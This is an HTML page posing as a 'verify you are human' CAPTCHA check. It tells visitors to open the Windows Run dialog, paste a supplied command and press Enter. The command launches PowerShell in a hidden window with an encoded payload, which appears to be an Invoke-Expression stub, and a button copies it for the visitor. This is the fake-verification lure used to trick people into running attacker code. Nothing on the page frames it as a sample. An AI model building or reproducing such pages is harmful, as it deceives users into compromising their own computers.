<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Human verification required</title>
    <style>
      body { font-family: Arial, sans-serif; margin: 0; background: #0b0d10; color: #f3f4f6; }
      .card { max-width: 720px; margin: 60px auto; padding: 32px; background: #11151b; border-radius: 18px; }
      pre { background: #05070a; padding: 16px; border-radius: 12px; overflow: auto; }
      button { padding: 12px 18px; border-radius: 10px; border: 0; background: #2563eb; color: white; }
    </style>
  </head>
  <body>
    <div class="card captcha-box" data-command="powershell -w hidden">
      <h1>Verify you are human</h1>
      <p>To continue, press Win+R, paste the command below, then press Enter.</p>
      <pre>powershell -nop -w hidden -EncodedCommand SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgApAA==</pre>
      <button>Copy command</button>
    </div>
  </body>
</html>
